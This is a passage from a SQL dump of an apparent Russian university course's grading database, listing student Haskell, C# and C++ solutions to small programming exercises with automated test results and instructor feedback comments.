(989, 31, '533223', '2012-09-24 12:54:36', 1, 'parts2 xs = if ((rem res 2) == 0)\r\n		then (f xs (-1) (-1) (div res  2) (div res 2))\r\n		else False\r\n			where res = (length xs)\r\n\r\nf [] _ _ _ _ = True\r\nf (x:xs) m1 m2 0 q2 = if(x>m2) then (f xs m1 x 0 (q2-1))\r\n			else False\r\nf (x:xs) m1 m2 q1 q2 = \r\n			if(x>m1&&x>m2) \r\n				then (f xs x m2 (q1-1) q2)||(f xs x m1 (q2-1) q1)\r\n				else if(x>m1) \r\n					then (f xs x m2 (q1-1) q2)\r\n					else if(x>m2) \r\n						then (f xs x m1 (q2-1) q1)\r\n						else False', '<br/>Тесты успешно пройдены!'),
(990, 39, 'erwert', '2012-09-24 13:04:20', 0, 'minHeight t = hm 0 t\r\nhm n t = if (hh n t) then n else hm (n+1) t\r\n\r\nhh n Empty = True\r\nhh n (Node _ Empty Empty) = True\r\nhh 0 (Node _ _ _) = False\r\nhh n (Node _ l r) = hh (n - 1) l || hh (n - 1) r', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(991, 39, 'erwert', '2012-09-24 13:04:38', 2, '--- Нет, это не совсем то, тут нет оптимизации, о которой мы говорили\r\n\r\ndata Tree = Empty | Node Integer Tree Tree deriving Eq\r\n\r\nminHeight t = hm 0 t\r\nhm n t = if (hh n t) then n else hm (n+1) t\r\n\r\nhh n Empty = True\r\nhh n (Node _ Empty Empty) = True\r\nhh 0 (Node _ _ _) = False\r\nhh n (Node _ l r) = hh (n - 1) l || hh (n - 1) r', '<br/>Тесты успешно пройдены!'),
(992, 45, '2118411', '2012-09-24 13:08:51', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[][] array = { new int[]{ 1, 2 }, new int[]{ 3, 4 }, new int[]{ 5, 6 } };\r\n\r\n            int[][] array2 = { new int[] { 1, 2 }, new int[] { 3, 4 }, new int[] { 5, 3 } };\r\n\r\n\r\n\r\n            bool a = array.All(x => x.Any(y => y % 2 == 0));\r\n\r\n            bool b = array2.All(x => x.Any(y => y % 2 == 0));\r\n\r\n            Console.WriteLine("{0} (Expected True)"+Environment.NewLine+"{1} (Expected False)", a,b);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(993, 46, '2118411', '2012-09-24 13:19:54', 1, '#include <iostream>\r\n\r\n#include <algorithm>\r\n\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\n\r\n\r\nint main () {\r\n\r\n  vector<int> myvector;\r\n\r\n  vector<int>::iterator it;\r\n\r\n\r\n\r\n  myvector.push_back(11);\r\n\r\n  myvector.push_back(25);\r\n\r\n  myvector.push_back(41);\r\n\r\n  myvector.push_back(55);\r\n\r\n\r\n\r\n  cout << (find_if (myvector.begin(), myvector.end(), [](int x) { return (x%2)==0; }) != myvector.end()? "Found": "Not found");\r\n\r\n\r\n\r\n  char c;\r\n\r\n  cin >> c;\r\n\r\n  return 0;\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(994, 39, 'erwert', '2012-09-24 14:33:29', 0, 'data Tree = Empty | Node Integer Tree Tree deriving (Show,Eq)\r\n\r\nminHeight t = go 0 [t]\r\ngo n t =  if foldl (||)  False [check (hh n q) | q <- t] then (n - 1) else go (n+1) t\r\ncheck (list) = foldr (||) False (map (== Empty) list)\r\nhh 0 t = [t]\r\nhh 1 Empty = []\r\nhh 1 (Node _ Empty r) = [r]\r\nhh 1 (Node _ l Empty) = [l]\r\nhh n (Node _ l r) = hh (n - 1) l ++ hh (n - 1) r\r\n', '<br/>Тесты успешно пройдены!'),
(995, 43, 'Deutsche', '2012-09-24 15:33:33', 1, 'euclid a b = let\r\n		(x, y, gcd) = xygcd a b 0 1 1 0	-- считаем НОД(a, b) вместе с нужным представлением\r\n	     in \r\n		if (gcd == 1)\r\n			then (x, y)\r\n		else\r\n		if (gcd == (-1))\r\n			then (-x, -y)\r\n		else (0, 0) -- если при вычислении обнаружили, что НОД(a, b) не равно 1, т.е. условие "некорректное"\r\n\r\n-- a=b*q+r, на новом шаге сохраняем старые значения (xold, yold) := (xnew, ynew) и пересчитываем новые (xnew, ynew) = (xold - q * xnew, yold - q * ynew), если понадобятся для следующего шага,\r\n-- когда получили r=0, то алгоритм заканчивается (a:=b, b:=r=0, и выход), выдавая значения, полученные на предпоследнем шаге (т.к. последний пересчёт уже не актуален) (x, y) := (xold, yold),\r\n-- НОД(a,b)=НОД(b, a mod b), НОД(a,0)=a, нужно проверить |a|=1 на всякий случай\r\n\r\nxygcd a 0 _  _  xold yold = (xold, yold, a)\r\nxygcd a b xnew ynew xold yold = let\r\n				(q, r) = a `divMod` b\r\n			in xygcd b r (xold - q * xnew) (yold - q * ynew) xnew ynew', '<br/>Тесты успешно пройдены!'),
(996, 39, 'erwert', '2012-09-24 16:51:40', 1, '-- на всякий случай, еще одно (=, тут поиск в ширину в прямом смысле. Крайне императивное получилось решение.\r\n  --- ОК, засчитано) На самом деле то, что решение императивное - это, я думаю, объективно,\r\n  --- это как раз пример, где хорошо бы иметь глобальную переменную и менять ее, те как раз то,\r\n  --- что Хаскел, в общем-то не умеет. Я это собственно и давал, как ''плохой'' пример, где\r\n  --- ФП не очень удобно. \r\n  --- Наверное, кстати, это можно красиво написать с монадами, они же как раз и предназначены,\r\n  --- чтобы заменять побочные эффекты. Но я пока как-то не соображу, как бы это написать. \r\n\r\ndata Tree = Empty | Node Integer Tree Tree deriving (Show,Eq)\r\n\r\nminHeight t = go False 0 [t]\r\ngo True n list = n - 1\r\ngo b n list = go (foldl (||) False [check (height t) | t <- list]) (n+1) (conc list)\r\ncheck list = foldl (||) False (map (== Empty) list)\r\nconc [] = []\r\nconc (l:ls) = height l ++ conc ls\r\nheight (Node _ Empty Empty) = [Empty]\r\nheight (Node _ Empty r) = [r]\r\nheight (Node _ l Empty) = [l]\r\nheight (Node _ l r) = [l,r]', '<br/>Тесты успешно пройдены!'),
(997, 37, '355679', '2012-09-24 17:57:11', 1, '--- ой, я не тот файл загрузил в тот раз просто..\r\n\r\nminsum (x:xs) = fst (foldl\r\n\r\n	( (sum, prev) x -> (min (x + prev) sum, x) )\r\n\r\n	(1/0, x)\r\n\r\n	xs)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(998, 30, '318210', '2012-09-24 18:51:19', 1, 'parts [] = error "not enough elements"\r\nparts [h] = False\r\nparts (h : s) = parts1 (s) [] 1 h \r\n\r\nparts1 [] (xs) curr h1 = isParts (curr :xs)\r\nparts1 (h : s) (xs) curr h1 | h1 < h = parts1 (s) (xs) (curr + 1) h\r\n			    | h1 >= h = parts1 (s) (curr : xs) 1 h\r\n\r\nisParts [h] = True\r\nisParts (h : h1 :xs) | length(xs) == 0 = gcd h h1 > 1\r\n			| otherwise = isParts ( (gcd h h1) : xs)', '<br/>Тесты успешно пройдены!'),
(999, 35, '17107004', '2012-09-24 19:43:45', 0, '\n\nd (x1, y1) (x2, y2) = sqrt ( (x1 - x2) ** 2 + (y1 - y2) ** 2)\n\n\n\nisosc a b c = let l = map ( (x, y) -> d x y) [(a,b), (b,c), (a,c)]\n\n		in any id (zipWith (==) l (tail l))\n\n\n', 'Выражение имеет неправильное значение: isosc (2,2) (0, 2) (2, 0)'),
(1000, 35, '17107004', '2012-09-24 19:47:47', 1, '\r\nimport Data.List\r\n\r\n\r\n\r\nd (x1, y1) (x2, y2) = sqrt ( (x1 - x2) ** 2 + (y1 - y2) ** 2)\r\n    --- sqrt видимо лучше не извлекать - и быстрее, и ошибок округления не будет\r\n\r\n\r\n\r\nisosc a b c = let l = sort (map ( (x, y) -> d x y) [(a,b), (b,c), (a,c)])\r\n\r\n		in any id (zipWith (==) l (tail l))\r\n                  --- или вместо any id можно or\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1001, 36, '17107004', '2012-09-24 19:50:15', 1, '\r\ncubeTable n = map ( x -> (x, x * x * x)) [1..n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1002, 37, '17107004', '2012-09-24 19:52:21', 1, 'minsum lst = minimum (zipWith (+) lst (tail lst))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1003, 38, '17107004', '2012-09-24 20:01:49', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\n\r\n\r\nheight Empty = 0\r\n\r\nheight (Node x Empty Empty) = 0\r\n\r\nheight (Node n x y) = 1 + max (height x) (height y)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1004, 39, '17107004', '2012-09-24 20:35:22', 2, '\r\ndata Tree = Node Integer Tree Tree | Empty\r\n  --- На самом деле не совсем правильно, хотя идея правильная.\r\n  --- Например, так minHeight (Node 1 Empty (Node 2 Empty Empty))\r\n  --- у вас дает 2, а надо 1. Я добавил это в тесты (и еще один пример, на котором\r\n  --- ваша программа падает, увидите:)\r\n\r\nminHeight = mh 0 100500\r\n\r\n\r\n\r\nmh n m (Node i Empty Empty) = n\r\n\r\nmh n m (Node i Empty y) = if n < m then mh (1 + n) m (Node i y Empty) else m\r\n\r\nmh n m (Node i x y)  = if n < m then mh (1 + n) (mh (1 + n) m y) x else m\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1005, 40, '17107004', '2012-09-24 20:51:16', 1, '\r\nframe n = let f = take n (repeat 1) in\r\n\r\n	f : (take (n - 2) (repeat\r\n\r\n		(1 : (take (n - 2) (repeat 0)) ++ [1]))) ++ [f]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1006, 41, '17107004', '2012-09-24 21:01:26', 1, '\r\ncountOdd = foldr ((+) . ((flip mod) 2)) 0 \r\n    --- ну или foldr ((+) . (`mod` 2)) 0 \r\n    --- section как раз для таких случаев и предназачен\r\n\r\n\r\n\r\ncountOdd1 l = length (filter odd l)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1007, 42, '17107004', '2012-09-24 21:07:24', 0, '', 'Не удалось вычислить выражение "myfoldl (+) 0 [1,2,3]", проверьте правильность синтаксиса'),
(1008, 42, '17107004', '2012-09-24 21:07:43', 1, '\r\nmyfoldl f b [] = b\r\n\r\nmyfoldl f b l = myfoldl f (f b (head l)) (tail l)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1009, 31, '318210', '2012-09-24 22:36:14', 1, 'parts2 [] =False\r\n\r\nparts2 [h] = False\r\n\r\nparts2 (h1 : h2 : xs) | length(xs) `mod` 2 /= 0 = False\r\n\r\n			|h1 < h2 = parts3 (xs) [[h1] , (h2 : h1 : [])] [[h2] , []]  [[]] [[]]\r\n\r\n			|h1 == h2 = parts3 (xs) [[h1]] [[h2]] [[]] [[]]\r\n\r\n			|h1 > h2 = parts3 (xs) [[h2] , (h1 : h2 : [])] [[h1] , []]  [[]] [[]]\r\n\r\n\r\n\r\nparts3 [] (h : xs) ( h1 : xs1)  [[]] [[]] | length h == length h1 = True\r\n\r\n				| length(xs) == 0 = False\r\n\r\n				|otherwise = parts3 [] (xs) (xs1) [[]] [[]]\r\n\r\n\r\n\r\n\r\n\r\nparts3 (h : xs) (spis1) (spis2) (sp1) (sp2)\r\n\r\n	| length(spis1) == 0 = parts3 (xs) (sp1) (sp2) [[]] [[]] \r\n\r\n	| length(head(spis1)) == 0 && length(head(spis2)) /= 0 && h > head(head(spis2)) = parts3 (h : xs) (tail(spis1)) (tail(spis2)) (concat2 ( [[h], []], sp1)) (concat2 ( [head(spis2) , (h : head(spis2))], sp2))\r\n\r\n	| length(head(spis1)) == 0 && length(head(spis2)) /= 0 && h <= head(head(spis2)) = parts3 (h : xs) (tail(spis1)) (tail(spis2)) (concat2 ( [[h]], sp1)) (concat2 ( [head(spis2)], sp2))\r\n\r\n	\r\n\r\n	| length(head(spis1)) /= 0 && length(head(spis2)) == 0 && h > head(head(spis1)) = parts3 (h : xs) (tail(spis1)) (tail(spis2)) (concat2 ( [head(spis1), (h: head(spis1))], sp1)) (concat2 ( [[h], []], sp2))\r\n\r\n	| length(head(spis1)) /= 0 && length(head(spis2)) == 0 && h <= head(head(spis1)) = parts3 (h : xs) (tail(spis1)) (tail(spis2)) (concat2 ( [head(spis1)], sp1)) (concat2 ( [[h]], sp2))\r\n\r\n	\r\n\r\n\r\n\r\n	| h <= head(head(spis1)) && h <= head(head(spis2)) = parts3 (h : xs) (tail(spis1)) (tail(spis2)) (sp1) (sp2)\r\n\r\n	| h <= head(head(spis1)) && h > head(head(spis2)) = parts3 (h : xs) (tail(spis1)) (tail(spis2)) (concat2([(head(spis1))],sp1)) (concat2([h:head(spis2)],sp2))\r\n\r\n	| h > head(head(spis1)) && h <= head(head(spis2)) = parts3 (h : xs) (tail(spis1)) (tail(spis2)) (concat2([(h:head(spis1))],sp1)) (concat2([head(spis2)],sp2))\r\n\r\n\r\n	| h > head(head(spis1)) && h > head(head(spis2)) = parts3 (h : xs) (tail(spis1)) (tail(spis2)) (concat2([(h : head(spis1)), head(spis1)],sp1)) (concat2([head(spis2), h: head(spis2)],sp2))\r\n \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nconcat2 ((xs) , (xs1)) = concat3 (xs) (xs1) []\r\n\r\n\r\n\r\nconcat3 [] [] (xs) = reverse xs\r\n\r\nconcat3 [] [[]] (ans) = reverse (ans)\r\n\r\nconcat3 [] (xs) (ans) = concat3 (xs) [] (ans)\r\n\r\nconcat3 (h : xs) (xs1) (answ) =  concat3 (xs) (xs1) (h : answ)\r\n\r\n			\r\n', 'Выражение имеет неправильное значение: parts2 [4,3,2,1]'),
(1010, 45, '472848', '2012-09-25 06:54:04', 1, 'List<int> l1 = new List<int>(new int[] { 1, 2, 3 });\r\nList<int> l2 = new List<int>(new int[] { 1, 3, 4 });\r\nList<int> l3 = new List<int>(new int[] { 1, 3, 5 });\r\nList<List<int>> k1 = new List<List<int>>(new List<int>[] { l1, l2 });\r\nList<List<int>> k2 = new List<List<int>>(new List<int>[] { l1, l3 });\r\nFunc<List<List<int>>, bool> isEvenInAllLists = k => k.All(l => l.Any(x => x % 2 == 0));\r\nbool isEvenInAllLists1 = isEvenInAllLists(k1);\r\nbool isEvenInAllLists2 = isEvenInAllLists(k2);\r\nConsole.WriteLine(isEvenInAllLists1);\r\nConsole.WriteLine(isEvenInAllLists2);', '<br/>Тесты успешно пройдены!'),
(1011, 35, '472848', '2012-09-25 06:54:40', 1, 'dist (x1, y1) (x2, y2) = sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))\r\nisosc p1 p2 p3 = (dist p1 p2 == dist p1 p3) || (dist p1 p3 == dist p2 p3) || (dist p1 p2 == dist p2 p3)', '<br/>Тесты успешно пройдены!'),
(1012, 33, '472848', '2012-09-25 07:05:42', 1, 'static double integral(Func<double, double> func, double left, double right)\r\n{\r\n  double res = 0;\r\n  if (left > right)\r\n  {\r\n    Console.WriteLine("Левая граница меньше правой!!");\r\n       --- Ну только лучше не WriteLine, конечно, а бросить какое-нибудь исключение\r\n    return res;\r\n  }\r\n  const int numSteps = 100;\r\n  double step = (right - left) / (double)numSteps;\r\n  for (double x = left; x < right; x += step)\r\n  {\r\n    res += (func(x) + func(x + step)) * step / 2.0;\r\n        --- А тут лучше немного изменить, чтобы считать значения в каждой данной точке только один раз.\r\n        --- Тут это важно, ведь функция func вполне может оказаться какой-нибудь очень сложной.\r\n  }\r\n  return res;\r\n}\r\n\r\nstatic void Main(string[] args)\r\n{\r\n  double result = integral(x => x * x, 0, 1);\r\n  Console.WriteLine(result);\r\n}', '<br/>Тесты успешно пройдены!'),
(1013, 31, '3742311', '2012-09-25 07:52:36', 0, 'parts2tmp _ n1 _ n2 [] _ = n1 == n2\r\nparts2tmp l1 n1 l2 n2 (h:t) m = n1 < m && h > l1 && (parts2tmp h (n1 + 1) l2 n2 t m) || n2 < m && h > l2 && (parts2tmp l1 n1 h (n2 + 1) t m)\r\nparts2 l = parts2tmp ((minimum l) - 1) 0 ((minimum l) - 1) 0 l (mod (length l) 2)', 'Выражение имеет неправильное значение: parts2 [1, 3, 1, 8, 4, 9]'),
(1014, 31, '3742311', '2012-09-25 07:54:48', 1, 'parts2tmp _ n1 _ n2 [] _ = n1 == n2\r\nparts2tmp l1 n1 l2 n2 (h:t) m = n1 < m && h > l1 && (parts2tmp h (n1 + 1) l2 n2 t m) || n2 < m && h > l2 && (parts2tmp l1 n1 h (n2 + 1) t m)\r\nparts2 l = parts2tmp ((minimum l) - 1) 0 ((minimum l) - 1) 0 l (div (length l) 2)', '<br/>Тесты успешно пройдены!'),
(1015, 35, '3742311', '2012-09-25 08:02:54', 0, 'dist (x1, y1) (x2, y2) = (square (x1 - x2)) + (square (y1 - y2))\r\nisosc a b c = (dist a b) == (dist b c) || (dist a b) == (dist a c) || (dist a c) == (dist b c)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1016, 35, '3742311', '2012-09-25 08:12:42', 1, 'square x = x * x\r\ndist (x1, y1) (x2, y2) = (square (x1 - x2)) + (square (y1 - y2))\r\nisosc a b c = (dist a b) == (dist b c) || (dist a b) == (dist a c) || (dist a c) == (dist b c)', '<br/>Тесты успешно пройдены!'),
(1017, 36, '3742311', '2012-09-25 08:15:34', 0, 'cube x = x * x * x\r\ntocubepair x = (x, (cube x))\r\ncubeTable n = map tocubepair [1..n]', '<br/>Тесты успешно пройдены!'),
(1018, 36, '3742311', '2012-09-25 08:17:33', 1, 'cubeTable n = map (x -> (x, x * x * x)) [1..n]', '<br/>Тесты успешно пройдены!'),
(1019, 40, '3742311', '2012-09-25 08:23:03', 1, 'frame n = map (x -> if x == 1 || x == n then map (x -> 1) [1..n] else map (x -> if x == 1 || x == n then 1 else 0) [1..n]) [1..n]', '<br/>Тесты успешно пройдены!'),
(1020, 35, '532002', '2012-09-25 08:56:23', 1, 'isosc (x1,y1) (x2,y2) (x3,y3) = let dist (x1,y1) (x2,y2) = sqrt(abs(x2-x1)^2+abs(y2-y1)^2)\r\n\r\n                                    l1 = dist (x1,y1) (x2,y2)\r\n\r\n                                    l2 = dist (x1,y1) (x3,y3)\r\n\r\n                                    l3 = dist (x2,y2) (x3,y3) \r\n\r\n                                    res = if ((l1==l2)||(l1==l3)||(l2==l3)) then True else False\r\n\r\n                                in res \r\n   --- OK, но я бы некоторые места написал не совсем так (например, не стал бы извлекать кв.корень,\r\n   --- можно же просто сравнивать квадраты. А еще некоторые замечания мы обсудим на занятии). \r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1021, 36, '532002', '2012-09-25 08:56:52', 1, 'cubeTable n = map (x -> (x,x^3) ) [1..n] \r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1022, 37, '532002', '2012-09-25 09:18:07', 1, 'minsum (x:xs) = minimum (zipWith (+) (x:xs) xs)\r\n', '<br/>Тесты успешно пройдены!'),
(1023, 34, '472848', '2012-09-25 09:41:24', 1, 'template <class Func>\r\ndouble integral(Func func, double left, double right)\r\n{\r\n  double res = 0;\r\n  if (left > right)\r\n  {\r\n    printf("Левая граница меньше правой!!\r\n");\r\n       --- Не по теме курса, но тут лучше бросить исключение например. Печатать, не очень хорошо, ведь, например, функция может вызываться из windows программы \r\n    return res;\r\n  }\r\n  const int numSteps = 100;\r\n  double step = (right - left) / (double)numSteps;\r\n        --- Тут кстати (double) особо ни к чему, раз второй аргумент вещественный, то преобразование \r\n        --- будет сделано автоматически  \r\n  for (double x = left; x < right; x += step)\r\n  {\r\n    res += (func(x) + func(x + step)) * step / 2.0;\r\n  }\r\n  return res;\r\n}\r\n\r\ndouble f(double x){ return x;}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n  double result = integral([](double x) { return x*x; }, 0, 1);\r\n  printf("%f\r\n", result);\r\n  result = integral(f, 0, 1);\r\n  printf("%f\r\n", result);\r\n}', '<br/>Тесты успешно пройдены!'),
(1024, 46, '472848', '2012-09-25 10:03:50', 1, '#include <iostream>\r\n#include <vector>\r\n#include <iterator>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nbool hasEvenElement(vector<int> &v)\r\n   --- Не по теме курса, но лучше, понятно, const vector<int> &v \r\n{\r\n  return find_if(v.begin(), v.end(), [](int el)->bool {return el % 2 == 0;}) != v.end();\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n  setlocale(LC_ALL, "Russian");\r\n  vector<int> v;\r\n  v.push_back(3);\r\n  v.push_back(4);\r\n  v.push_back(5);\r\n  if (hasEvenElement(v))\r\n  {\r\n    printf("Есть четный элемент\r\n");\r\n  }\r\n  else\r\n  {\r\n    printf("Нет четного элемента\r\n");\r\n  }\r\n  return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1025, 36, '472848', '2012-09-25 10:11:40', 1, 'cubeTable n = map (i -> (i, i * i * i)) [1..n]', '<br/>Тесты успешно пройдены!'),
(1026, 41, '3742311', '2012-09-25 10:38:43', 0, 'countOdd l = foldr (+) 0 map (x -> (mod x 2)) l\r\ncountOdd1 l = sum map (x -> (mod x 2)) l', 'Не удалось вычислить выражение "countOdd [2, 3, 4, 8, 5, 33, 9]", проверьте правильность синтаксиса'),
(1027, 41, '3742311', '2012-09-25 10:41:49', 0, 'countOdd l = foldr (+) 0 map (x -> (mod x 2)) l\r\ncountOdd1 l = sum map (x -> (mod x 2)) l', 'Не удалось вычислить выражение "countOdd [2, 3, 4, 8, 5, 33, 9]", проверьте правильность синтаксиса'),
(1028, 41, '3742311', '2012-09-25 10:43:05', 0, 'countOdd l = foldr (+) 0 (map (x -> (mod x 2)) l)\r\ncountOdd1 l = sum (map (x -> (mod x 2)) l)', 'Не удалось вычислить выражение "countOdd [2, 3, 4, 8, 5, 33, 9]", проверьте правильность синтаксиса'),
(1029, 41, '3742311', '2012-09-25 10:43:24', 2, 'countOdd l = foldr (+) 0 (map (x -> (mod x 2)) l)\r\n    --- Нет, это, на самом деле, не по условию, в условии было \r\n    --- "В функции countOdd можно использовать _только_ стандартную функцию foldr."\r\n    --- Те тут map использовать нельзя.\r\ncountOdd1 l = sum (map (x -> (mod x 2)) l)', '<br/>Тесты успешно пройдены!'),
(1030, 42, '472848', '2012-09-25 10:47:26', 1, 'myfoldl op z [] = z\r\nmyfoldl op z (x:s) = myfoldl op (op z x) s', '<br/>Тесты успешно пройдены!'),
(1031, 41, '472848', '2012-09-25 11:07:00', 1, 'countOdd s = foldr (x z -> x `mod` 2 + z) 0 s\r\ncountOdd1 s = sum (map (x -> x `mod` 2) s)', '<br/>Тесты успешно пройдены!'),
(1032, 40, '374969', '2012-09-25 11:14:53', 1, 'insertInLineFrame countInsert innerElm frameElm = [frameElm] ++ [innerElm|x<-[1..countInsert]] ++ [frameElm]\r\n\r\nframe n = insert innerElm frameElm\r\n            where insert = insertInLineFrame (n-2)\r\n                  frameElm = insert 1 1\r\n                  innerElm = insert 0 1', '<br/>Тесты успешно пройдены!'),
(1033, 38, '374969', '2012-09-25 11:46:24', 1, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nheight Empty = -1\r\nheight (Node _ tree1 tree2) = 1 + max (height tree1) (height tree2)', '<br/>Тесты успешно пройдены!'),
(1034, 39, '374969', '2012-09-25 11:57:56', 0, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nheight Empty = -1\r\n-- Не оптимизировано\r\nheight (Node _ tree1 tree2) = 1 + min (height tree1) (height tree2)', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1035, 39, '374969', '2012-09-25 11:58:52', 0, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nminHeight Empty = -1\r\n-- Не оптимизировано\r\nminHeight (Node _ tree1 tree2) = 1 + min (height tree1) (height tree2)', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1036, 39, '374969', '2012-09-25 12:14:23', 2, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nminHeight Empty = -1\r\n-- Не оптимизировано\r\n   --- Это, к тому же, еще и не компилируется, а если бы компилировалось, то выдавала бы неправильный\r\n   --- ответ ((( Но, в любом случае, в этой задаче засчитывается только оптимизированная версия \r\nminHeight (Node _ tree1 tree2) = 1 + min (height tree1) (height tree2)', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1037, 31, 'erwert', '2012-09-25 14:57:50', 0, 'parts2 l = sho l [] (length l `div` 2) []\r\n\r\nsho [] l n o = False\r\nsho x l 0 o = if length x == 1 then check (o ++ x) && (c2 l (x ++ o)) else check o && (c2 l o)\r\nsho (x:xs) l n o = sho [t | t <- xs, t > x] (l ++ [x]) (n-1) (o ++ [t | t <- xs, t <=x])\r\n\r\nc2 x l = if length x == length l then True else False\r\ncheck [] = False\r\ncheck [x] = True\r\ncheck (x:y:xs) = if (x < y) then check (y:xs) else False', 'Выражение имеет неправильное значение: parts2 [1, 1]'),
(1038, 31, 'erwert', '2012-09-25 15:01:29', 2, 'parts2 l = sho l [] (length l `div` 2) []\r\n\r\nsho x l 0 o = if length x == 1 then check (o ++ x) && (c2 l (x ++ o)) else check o && (c2 l o)\r\nsho (x:xs) l n o = sho [t | t <- xs, t > x] (l ++ [x]) (n-1) (o ++ [t | t <- xs, t <=x])\r\n\r\nc2 x l = if length x == length l then True else False\r\ncheck [] = False\r\ncheck [x] = True\r\ncheck (x:y:xs) = if (x < y) then check (y:xs) else False', 'Выражение имеет неправильное значение: parts2 [1,6,9,7]'),
(1039, 36, '383483', '2012-09-25 15:41:35', 1, 'cubeTable n = map (i ->(i,i*i*i)) [1..n] ', '<br/>Тесты успешно пройдены!'),
(1040, 40, '472848', '2012-09-25 16:11:20', 1, 'fringe n = map (x -> 1) [1..n]\r\nbody n = map (x -> if (x == 1 || x == n) then 1 else 0) [1..n]\r\nframe n = map (x -> if (x == 1 || x == n) then fringe n else body n) [1..n]', '<br/>Тесты успешно пройдены!'),
(1041, 37, '472848', '2012-09-25 16:12:15', 1, 'minsum (x:s) = minimum(map ((x, y) -> x + y) (zip s (x:s)))', '<br/>Тесты успешно пройдены!'),
(1042, 35, '3431532', '2012-09-25 16:42:59', 1, 'isosc (x,y) (x1,y1) (x2,y2) = (lineSize (x,y) (x1,y1)) == (lineSize (x,y) (x2,y2)) || (lineSize (x,y) (x1,y1)) == (lineSize (x2,y2) (x1,y1)) || (lineSize (x,y) (x2,y2)) == (lineSize (x2,y2) (x1,y1))\r\n\r\nlineSize (x,y) (x1,y1) = sqrt((x-x1)^2 +(y-y1)^2)', '<br/>Тесты успешно пройдены!'),
(1043, 36, '3431532', '2012-09-25 17:07:48', 2, 'cubeTable x = reverse(pow x)\r\n\r\npow 0 = []\r\npow n = (n,n^3) : pow (n-1)\r\n   --- Не по условию ((( Тут нельзя определять свои рекурсивные функции, надо использовать стандартные. \r\n   --- И еще, раз уж я вам все равно пишу), укажите пожалуйста вашу фамилию (на первой странице, в настройках).', '<br/>Тесты успешно пройдены!'),
(1044, 38, '472848', '2012-09-25 17:26:09', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nheight Empty = 0\r\nheight (Node i t1 t2) = 1 + max (height t1) (height t2)', 'Выражение имеет неправильное значение: height (Node 1 Empty Empty)'),
(1045, 38, '472848', '2012-09-25 17:30:40', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nheight Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ t1 t2) = 1 + max (height t1) (height t2)', '<br/>Тесты успешно пройдены!'),
(1046, 36, '3431532', '2012-09-25 17:41:49', 1, 'cubeTable x = map pow [1..x]\r\n\r\npow x = (x, x^3)', '<br/>Тесты успешно пройдены!'),
(1047, 42, '3431532', '2012-09-25 18:20:12', 1, 'myfoldl (f) x []     = x \r\n                 \r\nmyfoldl (f) x (y:ys) = myfoldl f (f x y) ys', '<br/>Тесты успешно пройдены!'),
(1048, 39, '472848', '2012-09-25 18:24:06', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nf ((i, Node _ Empty Empty):xs) = i\r\nf ((i, Node _ Empty t):xs) = f (xs ++ [(i + 1, t)])\r\nf ((i, Node _ t Empty):xs) = f (xs ++ [(i + 1, t)])\r\nf ((i, Node _ t1 t2):xs) = f (xs ++ [(i + 1, t1), (i + 1, t2)])\r\nminHeight t = f [(0, t)]', '<br/>Тесты успешно пройдены!'),
(1049, 33, '3742311', '2012-09-25 18:25:02', 1, 'using System;\r\n\r\nnamespace Integral\r\n{\r\n    internal static class IntegralCounter\r\n    {\r\n        public static double Integral(Func<double, double> f, double a, double b)\r\n        {\r\n            int n = 100;\r\n            double dx = (b - a) / n;\r\n\r\n            double result = 0;\r\n\r\n            // метод левых прямоугольников\r\n            for (int i = 0; i < n; i++)\r\n            {\r\n                result += dx * f(a + dx * i);\r\n            }\r\n\r\n            return result;\r\n        }\r\n    }\r\n\r\n    public static class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            var result = IntegralCounter.Integral(x => x*x, 0, 1);\r\n            Console.WriteLine(result);\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
